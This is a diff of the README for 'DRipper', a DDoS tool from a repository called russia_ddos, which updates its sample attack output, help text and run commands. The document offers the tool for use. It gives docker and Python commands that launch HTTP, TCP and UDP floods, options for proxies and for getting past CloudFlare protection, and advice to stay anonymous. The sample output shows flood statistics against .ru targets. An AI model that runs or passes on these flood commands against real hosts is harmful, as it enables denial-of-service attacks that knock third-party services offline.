@@ -38,68 +38,62 @@ This script support HTTP/TCP/UDP flood attack. We recommend using this script fo
 ## How it looks
 
 ```bash
-──────────────────────────────────── Starting DRipper ────────────────────────────────────
-[23:29:24] (1/5) Trying connect to www.localhost.orc:443...                services.py:108
-──────────────────────────────────────────────────────────────────────────────────────────
+───────────────────────────────────────── Starting DRipper ─────────────────────────────────────────
+[23:17:39] (1/3) tcp://www.site1.ru:80/ (192.168.0.101:80) Trying to connect...      services.py:135
+           (1/3) tcp://www.site1.ru:80/ (192.168.0.101:80) Connected                 services.py:138
+           (1/3) https://www.site2.ru:443/ (192.168.0.102:443) Trying to connect...  services.py:135
+           (1/3) https://www.site2.ru:443/ (192.168.0.102:443) Connected             services.py:138
+────────────────────────────────────────────────────────────────────────────────────────────────────
 
 
-                   ██████╗ ██████═╗██╗██████╗ ██████╗ ███████╗██████═╗
-                   ██╔══██╗██╔══██║██║██╔══██╗██╔══██╗██╔════╝██╔══██║
-                   ██║  ██║██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
-                   ██║  ██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
-                   ██████╔╝██║  ██║██║██║     ██║     ███████╗██║  ██║
-                   ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
-                                                               v2.3.0
+                        ██████╗ ██████═╗██╗██████╗ ██████╗ ███████╗██████═╗
+                        ██╔══██╗██╔══██║██║██╔══██╗██╔══██╗██╔════╝██╔══██║
+                        ██║  ██║██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
+                        ██║  ██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
+                        ██████╔╝██║  ██║██║██║     ██║     ███████╗██║  ██║
+                        ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
+                                                                    v2.5.0
 
-             It is the end user's responsibility to obey all applicable laws.
-             It is just like a server testing script and Your IP is visible.
-                           Please, make sure you are ANONYMOUS!
+                  It is the end user's responsibility to obey all applicable laws.
+                  It is just like a server testing script and Your IP is visible.
+                                Please, make sure you are ANONYMOUS!
 
-                        https://github.com/alexmon1989/russia_ddos
+                             https://github.com/alexmon1989/russia_ddos
 
- ────────────────────────────────────────────────────────────────────────────────────────
-  Description                         Status
- ────────────────────────────────────────────────────────────────────────────────────────
-  Start Time, duration                2022-03-31 23:29:23 - 0:00:33
-  Your Country, Public IP             DK   45.*.*.*
-  Host Country, IP                    RU   127.0.0.1:443
-  HTTP Request                        GET: https://www.localhost.orc:443/
-  Attack Method                       http-flood
- ────────────────────────────────────────────────────────────────────────────────────────
-  Threads                             2
-  vCPU Count                          16
-  Socket Timeout (seconds)            1
-  Random Packet Length                False
- ────────────────────────────────────────────────────────────────────────────────────────
-  CloudFlare DNS Protection           Not protected
-  Last Availability Check             23:29:36
-  Host Availability                   Accessible in 19 of 21 zones (90%)
- ────────────────────────────────────────────────────────────────────────────────────────
-  HTTP-FLOOD Statistics
- ────────────────────────────────────────────────────────────────────────────────────────
-  Sent Bytes @ AVG speed                  99.18 MB @ 2.92 MB/s
-  Sent Packets @ AVG speed                 232,632 @ 6859 packets/s
-  Connections                         success: 4, failed: 0, success rate: 100 %
- ────────────────────────────────────────────────────────────────────────────────────────
-  Status Code Distribution            400: 100%
- ────────────────────────────────────────────────────────────────────────────────────────
+
+ ──────────────────────────────────────────────────────────────────────────────────────────────────
+  Description                                 Status
+ ──────────────────────────────────────────────────────────────────────────────────────────────────
+  Start Time, Duration                        2022-04-08 23:17:29  (0:00:14)
+  Your Country, Public IP                     DK   45.***.***.***
+  Total Threads                               200
+  vCPU Count                                  8
+  Socket Timeout (seconds)                    1
+  Random Packet Length                        True | Max length: 1024
+ ──────────────────────────────────────────────────────────────────────────────────────────────────
+  Target (tcp://www.site1.ru:80/)             1/2 (next in 1)
+ ──────────────────────────────────────────────────────────────────────────────────────────────────
+  Country, Host IP                            RU  192.168.0.101:80 (target-0)
+  Attack Method                               TCP-FLOOD
+  Threads                                     100
+  CloudFlare Protection                       Not protected
+  Availability (check-host.net)               ...detecting (TCP method)
+  Sent Bytes @ AVG speed                      1.73 MB @ 119.76 kB/s
+  Sent Packets @ AVG speed                      3,531 @ 238 packets/s
+  Connections                                 success: 100, failed: 0, success rate: 100 %
+ ──────────────────────────────────────────────────────────────────────────────────────────────────
 
   Events Log
- ────────────────────────────────────────────────────────────────────────────────────────
-  [23:29:24]  info   thread-2    Set attack method to http-flood
-  [23:29:24]  info   thread-1    Creating HTTP connection...
-  [23:29:24]  info   thread-2    Creating HTTP connection...
-  [23:29:25]  info   thread-5    Checking host statuses with check-host.net
-  [23:29:34]  warn   thread-1    Checked Response status... 400: Bad Request
-  [23:29:36]  info   thread-5    Host statuses updated with check-host.net
-  [23:29:43]  warn   thread-2    Checked Response status... 400: Bad Request
-  [23:29:54]  info   thread-2    Creating HTTP connection...
-  [23:29:54]  warn   thread-1    Checked Response status... 400: Bad Request
-  [23:29:54]  info   thread-1    Creating HTTP connection...
+ ──────────────────────────────────────────────────────────────────────────────────────────────────
+  [23:17:40]   info   target-0  thread-14   Creating new TCP connection...
+  [23:17:40]   info   target-0  thread-114  Creating new TCP connection...
+  [23:17:40]   info   target-0  thread-16   Creating new TCP connection...
+  [23:17:40]   info   target-0  thread-20   Creating new TCP connection...
+  [23:17:40]   info   target-0  thread-22   Creating new TCP connection...
 
-                            Press CTRL+C to interrupt process.
+                                 Press CTRL+C to interrupt process.
 
-                                    #StandWithUkraine
+                                         #StandWithUkraine
 ```
 
 ## Usage
@@ -110,52 +104,34 @@ We recommend to use `PowerShell` for Windows users to run the script, Linux/macO
 Run `dripper --help` to see detailed params description.
 
 ```bash
-
-██████╗ ██████═╗██╗██████╗ ██████╗ ███████╗██████═╗
-██╔══██╗██╔══██║██║██╔══██╗██╔══██╗██╔════╝██╔══██║
-██║  ██║██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
-██║  ██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
-██████╔╝██║  ██║██║██║     ██║     ███████╗██║  ██║
-╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
-                                           v2.0.0
-
-It is the end user's responsibility to obey all applicable laws.
-It is just like a server testing script and Your IP is visible.
-
-Please, make sure you are ANONYMOUS!
-
-Usage: dripper [options] arg
+Usage: DRipper.py [options] arg
 
 Options:
-  -h, --help            show this help message and exit
-  -s TARGET, --target=TARGET
-                        Attack target in {scheme}://{hostname}[:{port}][{path}] format. Multiple targets allowed.
-  -t THREADS_COUNT, --threads=THREADS_COUNT (default: 100)
-                        Threads count.
-  -r RANDOM_PACKET_LEN, --random_len=RANDOM_PACKET_LEN (default: 1)
-                        Send random packets with random length. Turn on: 1, turn off: 0.
-  -l MAX_RANDOM_PACKET_LEN, --max_random_packet_len=MAX_RANDOM_PACKET_LEN
-                        Max random packets length (default: 48 for udp, 1000 for tcp, 0 for http).
-  -m ATTACK_METHOD, --method=ATTACK_METHOD
-                        Attack method: udp-flood, tcp-flood, http-flood. Could be auto-detected based on the scheme (protocol) of the target.
-  -y FILENAME, --proxy_list=FILENAME
-                        File (fs or http/https) with proxies in ip:port:username:password or ip:port line format.
-                        Proxies will be ignored in udp attack!
-                        Examples: proxylist.txt, https://proxies.com/fhjhajkdashdja
-  -k PROXY_TYPE, --proxy_type=PROXY_TYPE (default socks5)
-                        Type of proxy to work with. Supported types: socks5, socks4, http.
-  -c STATE, --health_check=STATE (default: 1)
-                        Controls health check availability. Turn on: 1, turn off: 0.
-  -e HTTP_METHOD, --http_method=HTTP_METHOD (default: GET)
-  -o SOCKET_TIMEOUT, --socket_timeout=SOCKET_TIMEOUT (default: 10 without proxy, 20 with proxy)
-                        Timeout in seconds for socket connection is seconds.
-  -d, --dry-run         Print formatted output without full script running.
-  --log-size=LOG_SIZE   Set the Events Log history frame length.
-  --log-level=EVENT_LEVEL
-                        Log level for events board. Supported levels: info,
-                        warn, error, none.
+  --version                                             show program's version number and exit
+  -h, --help                                            show this help message and exit
+  -s TARGETS, --targets=TARGETS                         Attack target in {scheme}://{hostname}[:{port}][{path}] format.
+                                                        Multiple targets allowed.
+  -m ATTACK_METHOD, --method=ATTACK_METHOD              Attack method: udp-flood, tcp-flood, http-flood, http-bypass
+  -e HTTP_METHOD, --http-method=HTTP_METHOD             HTTP method. Default: GET
+  -t THREADS_COUNT, --threads=THREADS_COUNT             Total threads count. Default: 100
+  -r RANDOM_PACKET_LEN, --random-len=RANDOM_PACKET_LEN  Send random packets with random length. Default: 1
+  -l MAX_RANDOM_PACKET_LEN, --max-random_packet-len=MAX_RANDOM_PACKET_LEN
+                                                        Max random packets length. Default: 1024 for udp/tcp
+  -y PROXY_LIST, --proxy-list=PROXY_LIST                File (fs or http/https) with proxies in
+                                                        ip:port:username:password line format. Proxies will be ignored
+                                                        in udp attack!
+  -k PROXY_TYPE, --proxy-type=PROXY_TYPE                Type of proxy to work with. Supported types: socks5, socks4,
+                                                        http. Default: socks5
+  -c HEALTH_CHECK, --health-check=HEALTH_CHECK          Controls health check availability. Turn on: 1, turn off: 0.
+                                                        Default: 1
+  -o SOCKET_TIMEOUT, --socket-timeout=SOCKET_TIMEOUT    Timeout for socket connection is seconds. Default (seconds): 1
+                                                        without proxy, 2 with proxy
+  -d, --dry-run                                         Print formatted output without full script running.
+  --log-size=LOG_SIZE                                   Set the Events Log history frame length.
+  --log-level=EVENT_LEVEL                               Log level for events board. Supported levels: info, warn, error,
+                                                        none.
 
-Example: dripper -s http://192.168.0.1 -t 100
+Example: dripper -t 100 -m tcp-flood -s tcp://192.168.0.1:80
 ```
 
 ## How to Run
@@ -164,17 +140,17 @@ Example: dripper -s http://192.168.0.1 -t 100
 
 ```bash
 # HTTP flood
-docker run -it --rm alexmon1989/dripper:latest -s http://127.0.0.1:80 -t 100 -m http-flood
+docker run -it --rm alexmon1989/dripper:latest -t 100 -m http-flood -s http://127.0.0.1:80 
 # or
-docker run -it --rm alexmon1989/dripper:latest -s http://127.0.0.1:80 -t 100
+docker run -it --rm alexmon1989/dripper:latest -t 100 -s http://127.0.0.1:80
 # or even
-docker run -it --rm alexmon1989/dripper:latest -s http://127.0.0.1 -t 100
+docker run -it --rm alexmon1989/dripper:latest -s http://127.0.0.1
 
 # TCP flood
-docker run -it --rm alexmon1989/dripper:latest -s tcp://127.0.0.1:80 -t 100 -l 2048
+docker run -it --rm alexmon1989/dripper:latest -t 100 -l 2048 -s tcp://127.0.0.1:80 
 
 # UDP flood
-docker run -it --rm alexmon1989/dripper:latest -s udp://127.0.0.1:80 -t 100 -l 2048
+docker run -it --rm alexmon1989/dripper:latest -t 100 -l 2048 -s udp://127.0.0.1:80 
 ```
 
 #### Directly with Python.
@@ -188,7 +164,7 @@ cd russia_ddos
 # Install dependencies
 python3 -m pip install --upgrade pip git+https://github.com/alexmon1989/russia_ddos.git
 # Run script
-dripper -s udp://127.0.0.1:80 -t 100 -r 1
+dripper -t 100 -s udp://127.0.0.1:80
 
 
 # ===== Alternative variant =====
@@ -196,7 +172,7 @@ dripper -s udp://127.0.0.1:80 -t 100 -r 1
 # Install python dependencies:
 pip install -r requirements.txt
 # Run script
-python3 DRipper.py -s udp://127.0.0.1:80 -t 100 -r 1
+python3 DRipper.py -t 100 -s udp://127.0.0.1:80
 ```
 
 #### Kubernetes
@@ -208,12 +184,15 @@ For details - see the [README][kube-dripper-readme] from **kube-dripper** projec
 
 #### Prepare
 ```bash
-pip install pytest
+pip install -r requirements.test.txt
 ```
 
 #### Run
 ```bash
 pytest
+
+# with code coverage report:
+pytest --cov-report=html:./htmlcov
 ```
 
 # License
